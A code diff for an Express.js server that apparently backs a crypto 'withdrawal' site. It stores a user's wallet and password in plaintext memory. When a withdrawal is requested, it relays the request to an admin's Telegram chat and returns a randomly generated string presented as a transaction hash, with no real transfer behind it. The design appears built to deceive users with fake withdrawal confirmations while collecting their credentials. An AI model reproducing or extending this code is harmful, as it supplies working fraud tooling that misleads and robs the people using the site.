@@ -1,61 +1,58 @@
 const express = require("express");
-const cors = require("cors");
-const bodyParser = require("body-parser");
 const axios = require("axios");
-
 const app = express();
-app.use(cors());
-app.use(bodyParser.json());
+app.use(express.json());
 
-// =========================
-// ENV VARIABLES
-// =========================
+// Telegram Bot ENV
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
-const WEBHOOK_URL = process.env.WEBHOOK_URL;
+
+// Temporary memory
+let savedWallet = null;
+let savedPassword = null;
 
 // =========================
-// MEMORY STORAGE
-// =========================
-let boundWallet = null;
-let boundPassword = null;
-
-// =========================
-// API: Bind Wallet
+// Bind Wallet
 // =========================
 app.post("/api/wallet", (req, res) => {
     const { wallet, password } = req.body;
 
-    if (!wallet || !password)
-        return res.json({ ok: false, error: "Missing fields" });
+    if (!wallet) return res.json({ ok: false, error: "Wallet required" });
+    if (!password) return res.json({ ok: false, error: "Password required" });
 
-    if (boundWallet)
-        return res.json({ ok: false, error: "Wallet already bound" });
+    // First time bind
+    if (!savedWallet && !savedPassword) {
+        savedWallet = wallet;
+        savedPassword = password;
 
-    boundWallet = wallet;
-    boundPassword = password;
+        return res.json({
+            ok: true,
+            wallet: savedWallet
+        });
+    }
 
-    return res.json({ ok: true });
+    // Already bound
+    return res.json({
+        ok: false,
+        error: "Wallet already bound"
+    });
 });
 
 // =========================
-// API: Withdraw
+// Withdrawal
 // =========================
 app.post("/api/withdraw", async (req, res) => {
     const { coin, amount, usdt, wallet, password } = req.body;
 
-    if (!coin || !amount || !wallet || !password)
-        return res.json({ ok: false, error: "Missing fields" });
+    if (!wallet) return res.json({ ok: false, error: "Wallet missing" });
+    if (wallet !== savedWallet) return res.json({ ok: false, error: "Wallet mismatch" });
+    if (password !== savedPassword) return res.json({ ok: false, error: "Wrong password" });
 
-    if (wallet !== boundWallet)
-        return res.json({ ok: false, error: "Wallet mismatch" });
+    // Generate hash
+    const hash = "TX" + Math.floor(100000000 + Math.random() * 900000000);
 
-    if (password !== boundPassword)
-        return res.json({ ok: false, error: "Wrong password" });
-
-    const hash = "#TX" + Math.floor(100000000 + Math.random() * 900000000);
-
-    const msg =
+    // Telegram Message
+    const message =
 `📤 NEW WITHDRAWAL REQUEST
 --------------------------------
 💰 Coin: ${coin}
@@ -68,15 +65,33 @@ app.post("/api/withdraw", async (req, res) => {
 Please screenshot the transaction hash for record.`;
 
     // Send to Telegram
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        chat_id: ADMIN_CHAT_ID,
-        text: msg
-    });
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: ADMIN_CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+        });
+    } catch (err) {
+        console.log("Telegram Error:", err?.response?.data || err);
+    }
 
-    res.json({ ok: true, hash });
+    return res.json({
+        ok: true,
+        hash
+    });
 });
 
 // =========================
-// Start Railway Server
+// Serve index.html
 // =========================
-app.listen(3000, () => console.log("🚀 Server running on 3000"));
+app.get("/", (req, res) => {
+    res.sendFile(__dirname + "/index.html");
+});
+
+// =========================
+// Start Server
+// =========================
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log("Server running on port " + PORT);
+});
